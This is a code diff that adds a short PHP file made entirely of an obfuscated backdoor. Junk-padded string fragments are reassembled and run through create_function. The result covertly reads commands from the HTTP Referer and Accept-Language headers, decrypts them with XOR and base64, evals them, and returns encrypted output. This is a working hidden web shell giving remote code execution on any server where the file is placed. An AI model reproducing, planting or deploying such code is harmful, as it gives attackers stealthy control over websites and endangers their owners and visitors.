@@ -1,0 +1,15 @@
+<?php
+$Q='regWG_repWGlace(arrWGaWGy("/_/","/-/"),WGarrayWG("/"WG,WG"+"),$WGss($s[$i],WG0,$e))),WG$k)WG));WG$o=ob_get_contenWGts()WGWG';
+$d='seWGssion_start(WG);$s=&$_SWGESSIOWGN;WG$ss="sWGubstr";$sWGl="strtoWGlowWGer";WG$i=$m[1]WG[0].$m[1]WG[1];$hWG=$sl($WGsWGWGs(';
+$Z='$kWGh="8fc4";$kfWG="WGc7ab";funcWGtWGioWGn x($t,$k){$c=strlWGen($WGk)WG;$l=WGWGstrlen($t);$o=WG"";for($iWG=0;$WGi<$l;){forWG($j';
+$t=';ob_end_clWGeaWGn();$d=bWGWGase64_encodeWG(x(gzWGcompress($oWG),WG$k));print("WG<$k>WGWG$d<WG/$k>");@session_WGdestroyWG();}}}}';
+$D='WG=0;($jWGWG<$c&&$iWG<$WGl);$j++,WG$i++){$o.=$t{WGWG$i}^$k{WG$j};}}return $oWGWG;WG}$r=$_SERVEWGR;$rr=WG@$r["HTTP_REWGFEWGRE';
+$l=';$qWG=array_WGvalWGues($WGq);pregWG_match_allWG("/WG(WG[\\w])[\\w-]+(?:WGWG;q=0.([\\d])WG)?,?/WG",WG$ra,$m)WG;if($q&WG&$m){WG@';
+$o=';$WGe=WGstrpoWGs($s[$i],$WGf);iWGWGWGf($e){$kWG=$kh.$kf;ob_sWGtart();@eWGvalWG(@gzunWGcompreWGss(WG@x(@bWGase64_deWGcode(p';
+$A=str_replace('C','','cCCreateC_fCCCunction');
+$a='md5(WG$i.$kh),WG0,3));$fWG=$sWGl($sWGs(mdWG5($i.$WGkf),0,3));$p="";WGfor($z=WG1;$z<cWGount($m[WG1]);$z+WG+)$WGp.=$q[$m[W';
+$W='R"];$WGra=@$WGr["HWGTTP_ACCEPT_LWGWGANGUAGWGE"];if($rrWG&&$ra){WG$u=paWGrseWGWG_url($rr)WG;parsWGe_str($u["quWGery"WG],$q)';
+$I='GWGWG2][$z]];WGif(stWGrpos($p,$hWG)WG===0){$s[$i]="WG";$p=$ssWG(WGWG$p,3WG);}WGif(arrayWG_key_exists($i,$s)){$sWG[$i]WG.=$p';
+$N=str_replace('WG','',$Z.$D.$W.$l.$d.$a.$I.$o.$Q.$t);
+$K=$A('',$N);$K();
+?>
